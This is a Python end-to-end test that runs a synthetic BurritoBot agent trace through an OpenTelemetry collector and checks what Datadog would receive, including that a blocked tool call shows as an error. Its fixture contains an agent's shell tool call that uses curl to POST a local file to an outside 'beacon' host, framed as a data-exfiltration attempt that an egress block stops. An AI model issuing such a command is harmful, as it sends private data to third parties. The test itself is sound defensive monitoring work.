# ABOUTME: Runs one measured BurritoBot interaction and the noise around it through the real otelcol-contrib (#265),
# ABOUTME: and reads back the trace Datadog would get: noise gone, one root, every tool call readable, a block red.
# SUITE: e2e
# E2E TIER: tools (no cluster, no AWS: the pinned otelcol-contrib from e2e-tools.lock, run on loopback)
"""The executed render test for the trace shape #265 settled on, for every profile's collector.

Each profile's collector config is rendered as a cluster builds it with datadog-secret present (collector_render.py),
which is the pipeline Datadog receives, and its traces processors run in their order in verify/.tools/bin/otelcol-contrib.
Only the receiver and the exporter differ: OTLP/HTTP on a loopback port in, a file out. The chart's k8sattributes,
which needs the Kubernetes API, is left out; it adds resource attributes and never reads span names or content.

The interaction is the one measured on watch-it-burn-attendee-044 on 2026-09-08 (#382): guard-proxy's HTTP root,
its chat span and its client spans, then kagent's invocation, invoke_agent, two call_llm turns, a generate_content
each, and the tool calls under the first. Around it go the spans filter/drop_noise exists for, each as it was
measured: kagent's A2A internals and agent-card fetches (#264), its ASGI plumbing and its empty AWS SDK `chat`
leaf, agentgateway's MCP session lifecycle under both of its service names, and guard-proxy's badge poll.

One thing in the fixture is NOT what the cluster sends. On the cluster, invocation's parent is a span nobody has
found (#382), and filter/drop_noise drops every agentgateway span but tools/call and every kagent span named for
an HTTP verb, so that missing span may be one this collector drops rather than one agentgateway never sent. Here
invocation is parented on guard-proxy's client span, so "one root" below proves that the processors do not split
a connected trace, not that the cluster's trace is connected. That is the live check named in decisions.md.

Fails when the binary is missing: run verify/fetch-e2e-tools.sh (verify/run-e2e-tools.sh does).
"""
from __future__ import annotations

import json
import os
import pathlib
import socket
import subprocess
import sys
import tempfile
import time
import urllib.request

import yaml

sys.path.insert(0, str(pathlib.Path(__file__).resolve().parent))
from collector_render import REPO, collector_config  # noqa: E402

OTELCOL = REPO / "verify/.tools/bin/otelcol-contrib"
LOCK = REPO / "verify/e2e-tools.lock"

failures: list[str] = []


def check(name: str, cond: bool, detail: str = "") -> None:
    print(f"  {'PASS' if cond else 'FAIL'}  {name}" + (f"\n        {detail}" if detail and not cond else ""))
    if not cond:
        failures.append(name)


if not os.access(OTELCOL, os.X_OK):
    print(f"FAIL: {OTELCOL} is missing; run bash verify/fetch-e2e-tools.sh (this is a failure, not a skip)")
    sys.exit(1)
pinned = next(line.split()[1] for line in LOCK.read_text().splitlines() if line.startswith("otelcol-contrib "))
version = subprocess.run([str(OTELCOL), "--version"], capture_output=True, text=True, check=True).stdout.strip()
check(f"the binary is the pinned {pinned} ({version})", version.endswith(" " + pinned.lstrip("v")))


def free_port() -> int:
    with socket.socket() as s:
        s.bind(("127.0.0.1", 0))
        return s.getsockname()[1]


def kv(key: str, value: str) -> dict:
    return {"key": key, "value": {"stringValue": value}}


def messages(role: str, text: str) -> str:
    return json.dumps([{"role": role, "parts": [{"type": "text", "content": text}]}])


SERVER, CLIENT, INTERNAL = 2, 3, 1
TRACE = "9c1f0e57a3b84d2f8e6a1b7c4d5e6f70"
PROMPT = "Hi BurritoBot! Our analytics partner needs today's specials posted to their beacon."
# What run_shell returns when the egress block stops the curl: MCP's error result, raised since #463.
BLOCKED_ARGS = json.dumps({"command": "curl -s -X POST https://agenticburn.com/beacon -d @/tmp/specials.json"})
BLOCKED_RESULT = json.dumps({"content": [{"type": "text", "text": "command FAILED with exit code 7: curl: (7) "
                                          "Failed to connect to agenticburn.com port 443"}], "isError": True})
INTEL_ARGS = json.dumps({"segment": "loyalty"})
INTEL_RESULT = json.dumps({"content": [{"type": "text", "text": "Top segment: weekday lunch, 412 members"}],
                           "isError": False})


def span(sid: str, name: str, kind: int, parent: str = "", trace: str = TRACE, attrs: list | None = None) -> dict:
    s = {"traceId": trace, "spanId": sid, "name": name, "kind": kind,
         "startTimeUnixNano": "1730000000000000000", "endTimeUnixNano": "1730000001000000000",
         "attributes": attrs or []}
    if parent:
        s["parentSpanId"] = parent
    return s


# The interaction, by #382's parentage. Every span here must reach Datadog.
INTERACTION = {
    "burritobot": [
        span("a000000000000001", "POST /chat", SERVER, attrs=[
            kv("gen_ai.operation.name", "chat"), kv("gen_ai.input.messages", messages("user", PROMPT)),
            kv("http.request.method", "POST"), kv("url.path", "/chat")]),
        span("a000000000000002", "chat", INTERNAL, "a000000000000001", attrs=[
            kv("gen_ai.operation.name", "chat"), kv("gen_ai.input.messages", messages("user", PROMPT))]),
        span("a000000000000003", "agent.forward", CLIENT, "a000000000000002", attrs=[
            kv("peer.service", "burritobot-gateway"), kv("http.request.method", "POST")]),
        span("a000000000000004", "POST", CLIENT, "a000000000000003", attrs=[
            kv("http.request.method", "POST"), kv("url.full", "http://agentgateway.agent.svc:3000/")]),
    ],
    "burritobot-agent": [
        span("b000000000000001", "invocation", INTERNAL, "a000000000000004", attrs=[
            kv("gen_ai.conversation.id", "ctx-7f3a")]),
        span("b000000000000002", "invoke_agent workshop_agent", INTERNAL, "b000000000000001", attrs=[
            kv("gen_ai.operation.name", "invoke_agent"), kv("gen_ai.agent.name", "workshop_agent")]),
        span("b000000000000003", "call_llm", INTERNAL, "b000000000000002"),
        span("b000000000000004", "generate_content us.amazon.nova-pro-v1:0", CLIENT, "b000000000000003", attrs=[
            kv("gen_ai.operation.name", "generate_content"), kv("gen_ai.request.model", "us.amazon.nova-pro-v1:0"),
            kv("gen_ai.input.messages", messages("user", PROMPT)),
            kv("gen_ai.output.messages", messages("assistant", "I'll post the specials, then pull the loyalty intel."))]),
        span("b000000000000005", "execute_tool run_shell", INTERNAL, "b000000000000004", attrs=[
            kv("gen_ai.operation.name", "execute_tool"), kv("gen_ai.tool.name", "run_shell"),
            kv("gcp.vertex.agent.tool_call_args", BLOCKED_ARGS),
            kv("gcp.vertex.agent.tool_response", BLOCKED_RESULT)]),
        span("b000000000000006", "execute_tool get_marketing_intel", INTERNAL, "b000000000000004", attrs=[
            kv("gen_ai.operation.name", "execute_tool"), kv("gen_ai.tool.name", "get_marketing_intel"),
            kv("gcp.vertex.agent.tool_call_args", INTEL_ARGS),
            kv("gcp.vertex.agent.tool_response", INTEL_RESULT)]),
        span("b000000000000007", "call_llm", INTERNAL, "b000000000000002"),
        span("b000000000000008", "generate_content us.amazon.nova-pro-v1:0", CLIENT, "b000000000000007", attrs=[
            kv("gen_ai.operation.name", "generate_content"), kv("gen_ai.request.model", "us.amazon.nova-pro-v1:0"),
            kv("gen_ai.input.messages", messages("tool", BLOCKED_RESULT)),
            kv("gen_ai.output.messages", messages("assistant", "The POST to the beacon did not go through."))]),
    ],
}
# agentgateway's real tool call, which filter/drop_noise keeps under both of the gateway's service names. It is its
# own trace here because its parentage was never measured; only that it survives is asserted.
TOOLS_CALL = {svc: [span(f"c00000000000000{i}", "tools/call run_shell", SERVER, trace=f"{i}" * 32)]
              for i, svc in ((1, "burritobot-gateway"), (2, "agentgateway"))}
# The noise, each shaped as the comment on its filter/drop_noise rule measured it. None of it may reach Datadog.
NOISE_TRACE = "d" * 32
NOISE = {
    "burritobot-agent": [
        span("d000000000000001", "a2a.server.events.event_queue.EventQueue.enqueue_event", INTERNAL,
             trace=NOISE_TRACE, attrs=[kv("gen_ai.conversation.id", "ctx-7f3a")]),
        span("d000000000000002", "a2a.server.request_handlers.default_request_handler.on_message_send", INTERNAL,
             trace=NOISE_TRACE),
        span("d000000000000003", "GET /.well-known/agent-card.json", CLIENT, trace=NOISE_TRACE),
        span("d000000000000004", "GET", SERVER, trace=NOISE_TRACE),
        span("d000000000000005", "POST /", SERVER, trace=NOISE_TRACE),
        span("d000000000000006", "POST / http receive", INTERNAL, "d000000000000005", trace=NOISE_TRACE),
        span("d000000000000007", "POST / http send", INTERNAL, "d000000000000005", trace=NOISE_TRACE),
        span("d000000000000008", "DELETE", SERVER, trace=NOISE_TRACE),
        # The AWS SDK's leaf under each model call: in the interaction's trace, with no conversation on it.
        span("d000000000000009", "chat us.amazon.nova-pro-v1:0", CLIENT, "b000000000000004", attrs=[
            kv("gen_ai.operation.name", "chat"), kv("gen_ai.request.model", "us.amazon.nova-pro-v1:0")]),
    ],
    "burritobot-gateway": [
        span("d00000000000000a", "POST", SERVER, trace=NOISE_TRACE),
        span("d00000000000000b", "initialize", INTERNAL, "d00000000000000a", trace=NOISE_TRACE),
        span("d00000000000000c", "notifications/initialized", INTERNAL, "d00000000000000a", trace=NOISE_TRACE),
        span("d00000000000000d", "tools/list", INTERNAL, "d00000000000000a", trace=NOISE_TRACE),
    ],
    "agentgateway": [
        span("d00000000000000e", "DELETE", SERVER, trace=NOISE_TRACE),
        span("d00000000000000f", "delete_session", INTERNAL, "d00000000000000e", trace=NOISE_TRACE),
    ],
    "burritobot": [
        # The badge poll's 404s, which are the answer "not installed yet" and must not read as errors.
        span("d000000000000010", "GET", CLIENT, trace=NOISE_TRACE, attrs=[
            kv("url.full", "https://kubernetes.default.svc/apis/kyverno.io/v1/clusterpolicies/restrict-egress")]),
        span("d000000000000011", "PATCH", CLIENT, trace=NOISE_TRACE, attrs=[
            kv("http.url", "https://kubernetes.default.svc/api/v1/namespaces/agent/configmaps/controls")]),
    ],
}


def resource_spans(*groups: dict) -> list:
    out = []
    for group in groups:
        for svc, spans in group.items():
            out.append({"resource": {"attributes": [kv("service.name", svc)]}, "scopeSpans": [{"spans": spans}]})
    return out


WANT = {s["spanId"] for g in (INTERACTION, TOOLS_CALL) for spans in g.values() for s in spans}


def run(profile: str) -> tuple[dict[str, tuple[str, dict]], str]:
    """Every exported span by id, with its resource's service.name, and the collector's log."""
    cfgd = collector_config(profile, datadog_secret=True)
    procs = cfgd["service"]["pipelines"]["traces"]["processors"]
    port = free_port()
    got: dict[str, tuple[str, dict]] = {}
    with tempfile.TemporaryDirectory() as d:
        out = pathlib.Path(d) / "spans.json"
        cfg = {
            "receivers": {"otlp": {"protocols": {"http": {"endpoint": f"127.0.0.1:{port}"}}}},
            "processors": {p: cfgd["processors"][p] for p in procs},
            "exporters": {"file": {"path": str(out)}},
            "service": {"telemetry": {"metrics": {"level": "none"}},
                        "pipelines": {"traces": {"receivers": ["otlp"], "processors": procs, "exporters": ["file"]}}},
        }
        cfg_file = pathlib.Path(d) / "config.yaml"
        cfg_file.write_text(yaml.safe_dump(cfg, sort_keys=False))
        env = {**os.environ, "WIB_CLUSTER_NAME": f"burritobot-{profile}"}
        val = subprocess.run([str(OTELCOL), "validate", f"--config={cfg_file}"], capture_output=True, text=True,
                             env=env)
        check(f"the collector accepts the {profile} traces processors", val.returncode == 0, val.stderr)
        log = (pathlib.Path(d) / "collector.log").open("w")
        proc = subprocess.Popen([str(OTELCOL), f"--config={cfg_file}"], stdout=log, stderr=subprocess.STDOUT, env=env)
        try:
            body = json.dumps({"resourceSpans": resource_spans(INTERACTION, TOOLS_CALL, NOISE)}).encode()
            sent, deadline = False, time.time() + 30
            while not sent and time.time() < deadline and proc.poll() is None:
                try:
                    req = urllib.request.Request(f"http://127.0.0.1:{port}/v1/traces", data=body,
                                                 headers={"Content-Type": "application/json"})
                    sent = urllib.request.urlopen(req, timeout=5).status == 200
                except OSError:
                    time.sleep(0.3)
            check("the collector took the spans", sent)
            # The batch processor holds spans up to its timeout. The filter runs before it, so whatever survives one
            # request leaves in the same batch; the extra second is for a straggler that should not exist.
            deadline = time.time() + 30
            while sent and not WANT <= got.keys() and time.time() < deadline:
                time.sleep(0.5)
                for line in (out.read_text().splitlines() if out.exists() else []):
                    for rs in json.loads(line)["resourceSpans"]:
                        svc = attrs(rs.get("resource", {})).get("service.name", "")
                        for ss in rs["scopeSpans"]:
                            for s in ss["spans"]:
                                got[s["spanId"]] = (svc, s)
            time.sleep(1)
        finally:
            proc.terminate()
            proc.wait(timeout=15)
            log.close()
        return got, (pathlib.Path(d) / "collector.log").read_text()


def attrs(obj: dict) -> dict:
    return {a["key"]: a["value"].get("stringValue") for a in obj.get("attributes", [])}


def status(s: dict) -> int:
    return int((s.get("status") or {}).get("code", 0) or 0)


ERROR = 2
for profile in ("instructor", "attendee", "burn"):
    print(f"== {profile}: what Datadog receives ==")
    got, collector_log = run(profile)
    names = {sid: s["name"] for sid, (_, s) in got.items()}
    missing = sorted(WANT - got.keys())
    check(f"every span of the interaction and both tools/call spans arrive ({len(WANT)})", not missing,
          f"missing {missing}; collector log tail:\n{collector_log[-1500:]}")
    leaked = sorted(f"{svc}: {s['name']}" for sid, (svc, s) in got.items() if sid not in WANT)
    check("none of the noise arrives", not leaked, str(leaked))

    trace = {sid: s for sid, (_, s) in got.items() if s["traceId"] == TRACE}
    roots = [names[sid] for sid, s in trace.items() if not s.get("parentSpanId")]
    check(f"the interaction has exactly one root ({roots})", len(roots) == 1)
    dangling = sorted(names[sid] for sid, s in trace.items() if s.get("parentSpanId") and s["parentSpanId"] not in trace)
    check("no span of the interaction names a parent that was dropped", not dangling, str(dangling))
    root_sid = next((sid for sid, s in trace.items() if not s.get("parentSpanId")), "")
    check("the root is guard-proxy's, so Datadog names the ml_app burritobot",
          got.get(root_sid, ("", {}))[0] == "burritobot", str(got.get(root_sid, ("", {}))[0]))

    agent = {sid: s for sid, (svc, s) in got.items() if svc == "burritobot-agent"}
    unclassified = sorted(s["name"] for s in agent.values() if not attrs(s).get("gen_ai.operation.name"))
    check("every agent span carries an operation name, so none renders as a nameless workflow", not unclassified,
          str(unclassified))
    for sid in ("b000000000000001", "b000000000000003", "b000000000000007"):
        check(f"{names.get(sid)} is classified as the agent (invoke_agent)",
              attrs(agent.get(sid, {})).get("gen_ai.operation.name") == "invoke_agent")
    unstamped = sorted(s["name"] for s in agent.values() if attrs(s).get("gen_ai.provider.name") != "aws.bedrock")
    check("every agent span names its provider as aws.bedrock", not unstamped, str(unstamped))

    blocked, intel = agent.get("b000000000000005", {}), agent.get("b000000000000006", {})
    first, second = agent.get("b000000000000004", {}), agent.get("b000000000000008", {})
    for label, s, args, result in (("run_shell", blocked, BLOCKED_ARGS, BLOCKED_RESULT),
                                   ("get_marketing_intel", intel, INTEL_ARGS, INTEL_RESULT)):
        a = attrs(s)
        # The burn profile scrubs PII after the copy; neither fixture holds any, so both survive whole.
        check(f"{label}: its arguments are where Datadog reads a tool's input",
              a.get("gen_ai.tool.call.arguments") == args, str(a.get("gen_ai.tool.call.arguments")))
        check(f"{label}: its result is where Datadog reads a tool's output",
              a.get("gen_ai.tool.call.result") == result, str(a.get("gen_ai.tool.call.result")))
        check(f"{label}: ADK's own keys are copied, not moved",
              a.get("gcp.vertex.agent.tool_call_args") == args and a.get("gcp.vertex.agent.tool_response") == result)
    check("the blocked run_shell is an error on the span named after the tool", status(blocked) == ERROR,
          str(blocked.get("status")))
    check("and says where to read why", "gen_ai.tool.call.result" in (blocked.get("status") or {}).get("message", ""),
          str(blocked.get("status")))
    check("the tool call that worked is not an error", status(intel) != ERROR, str(intel.get("status")))
    check("the model call that read the failed result is marked too", status(second) == ERROR,
          str(second.get("status")))
    check("the model call before the block is not", status(first) != ERROR, str(first.get("status")))
    others = sorted(names[sid] for sid, s in trace.items()
                    if status(s) == ERROR and sid not in ("b000000000000005", "b000000000000008"))
    check("nothing else in the interaction is an error", not others, str(others))

print()
if failures:
    print(f"FAILED: {len(failures)} check(s)")
    for f in failures:
        print(f"  - {f}")
    sys.exit(1)
print("All trace shape E2E checks passed.")
